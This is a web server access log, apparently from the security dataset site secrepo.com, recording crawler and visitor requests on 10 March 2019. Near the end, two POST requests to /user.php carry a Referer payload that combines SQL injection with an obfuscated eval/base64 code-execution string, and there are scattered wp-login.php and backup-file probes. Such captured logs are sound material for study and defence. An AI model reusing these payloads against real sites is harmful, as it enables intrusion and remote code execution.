54.36.150.180 - - [10/Mar/2019:03:16:00 -0700] "GET /self.logs/error.log.2016-08-04.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.72 - - [10/Mar/2019:15:31:04 -0700] "GET /self.logs/access.log.2018-08-22.gz HTTP/1.1" 200 24928 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [10/Mar/2019:15:31:09 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
66.220.149.26 - - [10/Mar/2019:15:33:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
66.220.149.9 - - [10/Mar/2019:15:33:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" 
54.36.150.187 - - [10/Mar/2019:15:34:03 -0700] "GET /self.logs/2016/access.log.2016-12-13.gz HTTP/1.1" 200 12155 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
36.110.199.39 - - [10/Mar/2019:15:35:01 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
36.110.199.39 - - [10/Mar/2019:15:35:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
54.36.148.76 - - [10/Mar/2019:15:36:30 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dpd.html HTTP/1.1" 200 1502 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
46.229.168.140 - - [10/Mar/2019:15:47:06 -0700] "GET /data HTTP/1.1" 404 303 "-" "Mozilla/5.0 (compatible; SemrushBot/3~bl; +http://www.semrush.com/bot.html)" 
41.223.160.131 - - [10/Mar/2019:16:00:57 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.150.164 - - [10/Mar/2019:16:01:15 -0700] "GET /self.logs/2016/access.log.2016-10-08.gz HTTP/1.1" 200 6718 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.16 - - [10/Mar/2019:16:07:15 -0700] "GET /self.logs/error.log.2019-02-28.gz HTTP/1.1" 200 6105 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.80 - - [10/Mar/2019:16:08:34 -0700] "GET /self.logs/error.log.2017-03-20.gz HTTP/1.1" 200 718 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [10/Mar/2019:16:11:57 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
199.58.86.209 - - [10/Mar/2019:16:19:26 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [10/Mar/2019:16:19:26 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [10/Mar/2019:16:19:28 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [10/Mar/2019:16:19:30 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.209 - - [10/Mar/2019:16:19:31 -0700] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.148.169 - - [10/Mar/2019:16:21:55 -0700] "GET /Datasets%20Description/PE_malware/?C=D;O=D HTTP/1.1" 200 528 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
76.116.65.149 - - [10/Mar/2019:16:26:55 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
76.116.65.149 - - [10/Mar/2019:16:26:55 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
76.116.65.149 - - [10/Mar/2019:16:26:55 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
76.116.65.149 - - [10/Mar/2019:16:26:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
54.36.149.3 - - [10/Mar/2019:16:45:41 -0700] "GET /self.logs/error.log.2016-04-11.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
66.249.66.89 - - [10/Mar/2019:16:53:10 -0700] "GET /tg_snort_fast.7z HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
216.244.66.245 - - [10/Mar/2019:16:53:18 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.148.154 - - [10/Mar/2019:16:55:31 -0700] "GET /self.logs/2016/access.log.2016-09-15.gz HTTP/1.1" 200 8359 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.101 - - [10/Mar/2019:16:56:36 -0700] "GET /self.logs/access.log.2018-06-11.gz HTTP/1.1" 200 21278 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.96.73.39 - - [10/Mar/2019:16:57:21 -0700] "HEAD / HTTP/1.1" 200 295 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
103.96.73.39 - - [10/Mar/2019:16:57:21 -0700] "GET //install/index.php.bak HTTP/1.1" 404 239 "http://www.secrepo.com//install/index.php.bak" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
54.36.148.227 - - [10/Mar/2019:16:58:37 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/?C=S;O=A HTTP/1.1" 200 671 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
81.40.248.3 - - [10/Mar/2019:16:59:57 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
40.77.167.136 - - [10/Mar/2019:17:00:46 -0700] "GET /self.logs/error.log.2016-06-12.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.103 - - [10/Mar/2019:17:05:48 -0700] "GET /self.logs/error.log.2018-08-15.gz HTTP/1.1" 200 6035 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [10/Mar/2019:17:15:56 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.85 - - [10/Mar/2019:17:16:52 -0700] "GET /self.logs/access.log.2015-07-08.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.176 - - [10/Mar/2019:17:19:03 -0700] "GET /self.logs/error.log.2015-02-14.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
36.67.125.89 - - [10/Mar/2019:17:19:16 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36" 
40.77.167.136 - - [10/Mar/2019:17:20:14 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
220.181.108.178 - - [10/Mar/2019:17:22:59 -0700] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.180 - - [10/Mar/2019:17:23:00 -0700] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
54.36.149.69 - - [10/Mar/2019:17:26:59 -0700] "GET /self.logs/error.log.2017-08-09.gz HTTP/1.1" 200 703 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.33 - - [10/Mar/2019:17:34:13 -0700] "GET /self.logs/error.log.2015-05-30.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.114 - - [10/Mar/2019:17:34:20 -0700] "GET /self.logs/access.log.2017-08-06.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
35.175.255.248 - - [10/Mar/2019:17:42:13 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "MixnodeCache/1.8 (+https://cache.mixnode.com/)" 
35.175.255.248 - - [10/Mar/2019:17:42:13 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "MixnodeCache/1.8 (+https://cache.mixnode.com/)" 
35.175.255.248 - - [10/Mar/2019:17:42:13 -0700] "GET /ads.txt HTTP/1.1" 301 494 "-" "MixnodeCache/1.8 (+https://cache.mixnode.com/)" 
180.163.220.5 - - [10/Mar/2019:17:49:02 -0700] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
42.236.10.124 - - [10/Mar/2019:17:49:11 -0700] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.66 - - [10/Mar/2019:17:49:12 -0700] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
183.198.23.105 - - [10/Mar/2019:17:52:06 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
54.36.148.185 - - [10/Mar/2019:17:53:40 -0700] "GET /self.logs/2015/error.log.2015-07-25.gz HTTP/1.1" 200 566 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.75 - - [10/Mar/2019:17:57:58 -0700] "GET /self.logs/access.log.2018-07-05.gz HTTP/1.1" 200 22395 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.114 - - [10/Mar/2019:18:05:46 -0700] "GET /self.logs/error.log.2018-07-13.gz HTTP/1.1" 200 4946 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
14.215.176.148 - - [10/Mar/2019:18:06:31 -0700] "GET / HTTP/1.1" 200 12470 "http://www.baidu.com/s?wd=beingzxd" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
54.36.149.19 - - [10/Mar/2019:18:09:01 -0700] "GET /self.logs/2015/error.log.2015-06-14.gz HTTP/1.1" 200 867 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.95 - - [10/Mar/2019:18:10:54 -0700] "GET /self.logs/access.log.2019-01-23.gz HTTP/1.1" 200 21936 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
78.108.108.192 - - [10/Mar/2019:18:14:02 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
101.87.217.88 - - [10/Mar/2019:18:14:06 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
113.171.224.176 - - [10/Mar/2019:18:21:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
129.211.102.114 - - [10/Mar/2019:18:24:35 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0.4 Waterfox/56.0.4" 
129.211.102.114 - - [10/Mar/2019:18:24:36 -0700] "GET / HTTP/1.1" 200 12470 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0.4 Waterfox/56.0.4" 
41.223.160.131 - - [10/Mar/2019:18:31:16 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
219.92.17.90 - - [10/Mar/2019:18:36:40 -0700] "GET /self.logs/ HTTP/1.1" 200 15292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
219.92.17.90 - - [10/Mar/2019:18:36:41 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
219.92.17.90 - - [10/Mar/2019:18:36:43 -0700] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17618 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
123.125.67.219 - - [10/Mar/2019:18:36:49 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.114 - - [10/Mar/2019:18:36:51 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.165 - - [10/Mar/2019:18:36:52 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" 
123.125.71.53 - - [10/Mar/2019:18:38:11 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23085939 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
219.92.17.90 - - [10/Mar/2019:18:38:23 -0700] "GET /self.logs/2015/ HTTP/1.1" 200 7437 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
35.185.130.40 - - [10/Mar/2019:18:40:35 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
35.185.130.40 - - [10/Mar/2019:18:40:35 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
35.185.130.40 - - [10/Mar/2019:18:40:36 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
35.185.130.40 - - [10/Mar/2019:18:40:37 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
61.132.54.2 - - [10/Mar/2019:18:44:34 -0700] "GET /favicon.ico HTTP/1.1" 304 163 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
40.77.167.38 - - [10/Mar/2019:18:48:22 -0700] "GET /self.logs/access.log.2017-03-16.gz HTTP/1.1" 200 30774 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
177.101.60.150 - - [10/Mar/2019:18:51:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15" 
14.215.176.9 - - [10/Mar/2019:18:52:02 -0700] "GET / HTTP/1.1" 301 483 "http://www.baidu.com/s?wd=tankpqm" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
14.215.176.15 - - [10/Mar/2019:18:52:03 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
124.115.222.149 - - [10/Mar/2019:18:52:46 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.149.15 - - [10/Mar/2019:18:56:50 -0700] "GET /self.logs/access.log.2018-11-13.gz HTTP/1.1" 200 21122 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [10/Mar/2019:19:00:58 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
111.204.219.193 - - [10/Mar/2019:19:02:15 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
118.25.147.223 - - [10/Mar/2019:19:12:01 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
118.25.147.223 - - [10/Mar/2019:19:12:01 -0700] "GET / HTTP/1.1" 200 12470 "http://secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
158.222.201.169 - - [10/Mar/2019:19:12:12 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
158.222.201.169 - - [10/Mar/2019:19:12:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
158.222.201.169 - - [10/Mar/2019:19:12:16 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
158.222.201.169 - - [10/Mar/2019:19:12:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
40.77.167.165 - - [10/Mar/2019:19:12:41 -0700] "GET /self.logs/access.log.2017-07-31.gz HTTP/1.1" 200 52295 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
190.196.119.33 - - [10/Mar/2019:19:18:02 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
190.196.119.33 - - [10/Mar/2019:19:18:06 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
73.172.237.145 - - [10/Mar/2019:19:19:49 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:19:19:49 -0700] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:19:19:49 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:19:19:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:19:20:40 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
73.172.237.145 - - [10/Mar/2019:19:21:11 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.149.84 - - [10/Mar/2019:19:21:12 -0700] "GET /self.logs/error.log.2017-12-07.gz HTTP/1.1" 200 2915 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
106.120.173.159 - - [10/Mar/2019:19:26:56 -0700] "GET / HTTP/1.1" 304 152 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
106.120.173.159 - - [10/Mar/2019:19:26:59 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
40.77.167.165 - - [10/Mar/2019:19:27:33 -0700] "GET /Datasets%20Description/?C=D;O=A HTTP/1.1" 200 577 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [10/Mar/2019:19:28:07 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
128.1.163.194 - - [10/Mar/2019:19:28:33 -0700] "POST /user.php HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
128.1.163.194 - - [10/Mar/2019:19:28:33 -0700] "POST /user.php HTTP/1.1" 404 239 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
52.212.146.96 - - [10/Mar/2019:19:30:01 -0700] "GET /self.logs/access.log.2019-03-04.gz HTTP/1.1" 200 19069 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Mar/2019:19:30:01 -0700] "GET /self.logs/access.log.2019-03-05.gz HTTP/1.1" 200 18516 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Mar/2019:19:30:02 -0700] "GET /self.logs/access.log.2019-03-06.gz HTTP/1.1" 200 78586 "-" "python-requests/2.12.1" 
52.212.146.96 - - [10/Mar/2019:19:30:02 -0700] "GET /self.logs/access.log.2019-03-07.gz HTTP/1.1" 200 22627 "-" "python-requests/2.12.1" 
